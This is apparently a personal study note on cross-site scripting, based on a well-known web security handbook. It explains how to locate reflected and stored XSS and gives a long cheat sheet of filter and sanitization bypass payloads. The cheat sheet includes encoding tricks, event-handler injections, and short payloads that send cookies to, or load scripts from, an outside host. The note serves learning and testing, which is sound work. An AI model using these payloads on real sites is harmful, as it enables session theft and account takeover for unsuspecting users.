`Note` `My notes on XSS for personal reference`

## 𝐗𝐒𝐒 𝐓𝐲𝐩𝐞𝐬

![XSS](https://user-images.githubusercontent.com/68887544/179921615-68aef3f0-3f23-450f-9fa8-2b93b690bb75.png)


# 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐞𝐝 𝐗𝐒𝐒

## 𝐅𝐢𝐧𝐝𝐢𝐧𝐠 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐞𝐝 𝐗𝐒𝐒
```
1. Submit a random string for example: myxssteststring
2. Identify all locations where this string is reflected in the application’s response
3. For each reflection, identify the syntactic context in which the reflected data appears.
4. Modify the payload accordingly to get an XSS.
5. If input is sanitized or filtered in anyway, try modifying your payload to make it 
circumvent the defense mechanism.
```

## 𝐂𝐨𝐦𝐦𝐨𝐧 𝐑𝐞𝐟𝐥𝐞𝐜𝐭𝐢𝐨𝐧 𝐏𝐨𝐬𝐢𝐭𝐢𝐨𝐧𝐬


![Common Reflection Positions](https://user-images.githubusercontent.com/68887544/179921399-fd02889c-d051-4876-bdfc-fb8484de0090.png)

> - When reflection is in the tag attribute
> ```
> "><script>alert(1)</script>
> " onfocus="alert(1)
> ```
>
> - Reflection is in a javascript string
> ```
> '; alert(1); var foo='
> ```
> 
> - Reflection is in an attribute containing URL
> ```
> javascript:alert(1);
> #"onclick="javascript:alert(1)
> ```

## 𝐁𝐞𝐚𝐭𝐢𝐧𝐠 𝐃𝐞𝐟𝐞𝐧𝐬𝐢𝐯𝐞 𝐅𝐢𝐥𝐭𝐞𝐫𝐬

![Defensive Filters](https://user-images.githubusercontent.com/68887544/179924065-d8766d18-fe90-40cb-8b46-23db6c3f03a6.png)

- When direct use of `<script>` tags are blocked
```
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click here</a>

where, base 64 encoded string is <script>alert(1)</script>
```

- When `<script>` is blocked but Event Handlers are allowed
```
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
```
```
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>
```
```
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
```
> - Event Handler in a closing tag:
```
</a onmousemove=alert(1)>
```
```
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

- When `<script>` is blocked but script pseudo protocl i.e. `javascript:alert(1)` is allowed
```
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
```

- Using dynamically evaluated styles:
```
<x style=x:expression(alert(1))>
<x style=behavior:url(#default#time2) onbegin=alert(1)>
```

- Others:
```
<iMg onerror=alert(1) src=a>
<[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>

where [%00] is null byte character


<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/”onerror=alert(1) src=a>
<img/’onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<script/anyjunk>alert(1)</script>
```

- When event handlers are blocked
```
<img o[%00]nerror=alert(1) src=a>
```

- When double quote and single quotes are blocked but backticks are allowed
```
<img onerror=`alert(1)`src=a>
```

- If filter checks attribute starting with `on`
```
<img src=`a`onerror=alert(1)>
<img/onerror=”alert(1)”src=a>
```

- When `alert()` is blocked
```
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>

<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>

```

- If `javascript:` is blocked
```
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
```

- When application performs double url decoding of input
```
%253cimg%20onerror=alert(1)%20src=a%253e
```

- When angle brackets are blocked, you can use double-angle quotation marks  (`%u00AB` and `%u00BB`) instead of tag brackets
```
«img onerror=alert(1) src=a»
```

- When input filter identify HTML tags by matching opening and closing brackets
```
<<script>alert(1);//<</script>
<script<{alert(1)}/></script>
```

- When you can control `content-type` or `charset` header 
```
// UTF-7 encoded
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-

// US-ASCII encoded
BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
73 63 72 69 70 74 BE ; script¾


// UTF-16 encoded
FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.


```

- When double quotes i.e quotation marks are blocked you can use `[%f0]`
- When input containing angle brackets are blocked you can use `“onload=alert(1);`

- Using javascript functions to bypass `alert()`
```
<script>a\u006cert(1);</script>
<script>eval(‘a\u006cert(1)’);</script>
<script>eval(‘a\x6cert(1)’);</script>
<script>eval(‘a\154ert(1)’);</script>
<script>eval(‘a\l\ert\(1\)’);</script>
<script>eval(‘al’+’ert(1)’);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
<script>’alert(1)’.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>
```

- If dots are blocked:
```
<script>alert(document[‘cookie’])</script>
<script>with(document)alert(cookie)</script>
```

- Combining multiple bypass techniques
```
<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
```

## 𝐁𝐞𝐚𝐭𝐢𝐧𝐠 𝐒𝐚𝐧𝐢𝐭𝐢𝐳𝐚𝐭𝐢𝐨𝐧

- If first occurence of `<script>` is being stripped:
```
<script><script>alert(1)</script>
```

- If the sanitization is being performed recursively
```
<scr<script>ipt>alert(1)</script>
```

- If the filter strips `<script>` recursively and then `<object>` recursively
```
<scr<object>ipt>alert(1)</script>
```

- If quotation marks are being sanitized using `\`, try to check if `\` itself is being escaped or not. If not:
```
foo\'; alert(1);//
```

- Here, if you fi nd that the backslash character is also being properly escaped, but angle brackets are returned unsanitized, you can use the following attack:
```
</script><script>alert(1)</script>

The attack works because browsers’ parsing of HTML
tags takes precedence over their parsing of embedded JavaScript
```

- If you can inject into a script, but you cannot use quotation marks because these are being escaped, you can use the `String.fromCharCode` technique to construct strings without the need for delimiters

- In cases where the script you are injecting into resides within an event handler, rather than a full script block, you may be able to HTML-encode your quotation marks to bypass the application’s sanitization and break out of the string you control.
```
foo&apos;; alert(1);//
```

## 𝐁𝐞𝐚𝐭𝐢𝐧𝐠 𝐋𝐞𝐧𝐠𝐭𝐡 𝐋𝐢𝐦𝐢𝐭𝐬

- if you are injecting into an existing script, the following 28-byte command transmits the user’s cookies to the server with hostname `a`:
```
open("//a/"+document.cookie)
```

- if you are injecting straight into HTML, the following 30-byte tag loads and executes a script from the server with hostname `a`:
```
<script src=http://a></script>
```

# 𝐒𝐭𝐨𝐫𝐞𝐝 𝐗𝐒𝐒

## 𝐅𝐢𝐧𝐝𝐢𝐧𝐠 𝐒𝐭𝐨𝐫𝐞𝐝 𝐗𝐒𝐒

- Submit unique value to each parameter and make note of every place where they are being reflected.
- Each place might have their own different sanitization in place
- If there is a file upload or download functionality, always probe it for stored xss.




## 𝐑𝐞𝐟𝐞𝐫𝐞𝐧𝐜𝐞𝐬:

- Web Application Hacker's Handbook 
  - Finding and Exploiting Reflected XSS Vulnerabilities
  - Finding and Exploiting Stored XSS Vulnerabilities

